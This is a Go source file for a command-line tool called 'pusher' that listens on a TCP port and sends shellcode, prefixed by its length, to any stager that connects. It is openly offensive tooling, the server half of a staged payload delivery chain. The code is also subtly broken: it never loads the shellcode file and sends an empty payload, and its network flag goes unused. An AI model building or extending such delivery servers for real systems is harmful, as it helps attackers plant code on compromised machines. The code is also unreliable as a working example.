package pusher

import (
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"os"

	"github.com/spf13/cobra"
)

// Opts holds the options for the pushed command
type Opts struct {
	address  string
	net      string
	fileName string
}

var pusherOpts Opts

// PusherCmd contains the CLI interface for the pusher command.
var PusherCmd = &cobra.Command{
	Use:   "pusher",
	Short: "pusher pushes shellcode to a stager",
	RunE: func(cmd *cobra.Command, args []string) error {
		return runPusherServer(pusherOpts)
	},
}

func init() {
	PusherCmd.PersistentFlags().StringVarP(&pusherOpts.address, "address", "a", ":5555",
		"listen address ([ip]:port)")
	PusherCmd.PersistentFlags().StringVarP(&pusherOpts.net, "net", "n", "tcp", "dial network")
	PusherCmd.PersistentFlags().StringVarP(&pusherOpts.fileName, "shellcode", "s", "",
		"file containing the shellcode")

	_ = PusherCmd.MarkPersistentFlagRequired("address")
	_ = PusherCmd.MarkPersistentFlagRequired("shellcode")
}

func runPusherServer(opts Opts) error {
	ln, err := net.Listen("tcp", opts.address)
	if err != nil {
		return fmt.Errorf("listen: %w", err) // nolint:staticcheck
	}

	log.Printf("Listening on %s/%s", opts.address, opts.net)

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Printf("accept: %v", err)
			continue
		}

		go serveShellcode(conn, []byte{})
	}
}

func serveShellcode(conn net.Conn, shellcode []byte) {
	defer conn.Close()

	log.Printf("Serving shellcode to %s", conn.RemoteAddr())

	size := make([]byte, 4)
	binary.LittleEndian.PutUint32(size, uint32(len(shellcode)))

	_, err := conn.Write(size)
	if err != nil {
		log.Printf("Error anouncing shellcode size: %v", err)
		return
	}

	_, err = conn.Write(shellcode)
	if err != nil {
		log.Printf("Error sending shellcode: %v", err)
		return
	}
}

// nolint:deadcode,unused
func main() {
	if err := PusherCmd.Execute(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
